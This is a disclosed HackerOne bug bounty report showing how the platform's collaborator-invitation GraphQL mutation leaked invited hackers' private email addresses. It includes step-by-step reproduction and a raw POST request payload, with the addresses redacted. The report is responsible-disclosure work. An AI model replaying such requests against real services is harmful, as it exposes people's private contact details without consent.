# An attacker can can view any hacker email via  /SaveCollaboratorsMutation operation name 

## Report Details
- **Report ID**: 2032716
- **URL**: https://hackerone.com/reports/2032716
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-06-20T20:03:46.070Z
- **Disclosed**: 2023-07-04T11:45:06.634Z

## Reporter
- **Username**: 0xrayan1996
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**

An attacker can view any attacker or normal user email after send invitation via dummy report , disclose their private email.
 
**Description:**

### Steps To Reproduce

1 - Create a dummy report and send it
2 - Add a hacker that you want to disclose his email  , Max is only 2 invites per report
3 - send the invite after sending the invite the hacker will be pending status until accept the report .
4- Go the pen on the right for adding more collaborator and click on the pen and capture traffic , you will see the user email in first request,
even that the user not accept the invitation yet  

HTTP Request : 
```
POST /graphql HTTP/2
Host: hackerone.com

[sinp]

{"operationName":"SaveCollaboratorsMutation","variables":{"input":{"report_id":2032701,"collaborators":[{"username_or_email":"testmealways","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999}]},"product_area":"collaboration","product_feature":"save_collaborators"},"query":"mutation SaveCollaboratorsMutation($input: SaveCollaboratorsMutationInput!) {\n  saveCollaborators(input: $input) {\n    was_successful\n    errors {\n      edges {\n        node {\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}

````

Example :

Here is email for todayisnew , Hacker 1 rank in H1 :

```
████████

```


Video PoC :

████████

## Impact

An attacker can view any user's email registered with Hackerone as hacker .

## Attachments
No attachments
